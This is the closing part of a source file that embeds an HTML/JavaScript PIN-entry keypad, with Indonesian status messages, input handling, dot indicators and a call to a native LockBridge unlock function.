  keypad.addEventListener('pointerdown', function(e){
    var key = e.target.closest('.key');
    handleKeyPress(key);
  });
} else {
  keypad.addEventListener('touchstart', function(e){
    var key = e.target.closest('.key');
    handleKeyPress(key);
  }, { passive: true });

  keypad.addEventListener('mousedown', function(e){
    var key = e.target.closest('.key');
    handleKeyPress(key);
  });
}

function doPress(n) {
  if (blocked || pin.length >= 4) return;
  pin += n;
  updateDots();
  if (pin.length === 4) setTimeout(checkPin, 150);
}

function doDelete() {
  if (blocked) return;
  pin = pin.slice(0, -1);
  updateDots();
  setStatus('', false, false);
}

function updateDots() {
  for (var i = 0; i < 4; i++) {
    var d = document.getElementById('d' + i);
    d.classList.toggle('filled', i < pin.length);
    d.classList.remove('error');
  }
}

function checkPin() {
  var ok = false;
  try { ok = LockBridge.tryUnlock(pin); } catch(e) {}
  if (ok) {
    setStatus('PIN Benar \u2713', false, true);
    var flash = document.createElement('div');
    flash.className = 'success-flash';
    document.body.appendChild(flash);
    setTimeout(function(){ flash.remove(); }, 800);
  } else {
    setStatus('PIN Salah!', true, false);
    for (var i = 0; i < 4; i++) {
      document.getElementById('d' + i).classList.add('error');
    }
    blocked = true;
    setTimeout(function() {
      pin = ''; blocked = false;
      updateDots();
      setStatus('Coba lagi', false, false);
    }, 1200);
  }
}

function setStatus(msg, isErr, isOk) {
  var el = document.getElementById('pinStatus');
  el.textContent = msg || 'by @Rizzisreal01';
  el.className = 'pin-status' + (isErr ? ' err' : isOk ? ' ok' : '');
}
</script>
</body>
</html>
"""
    }
}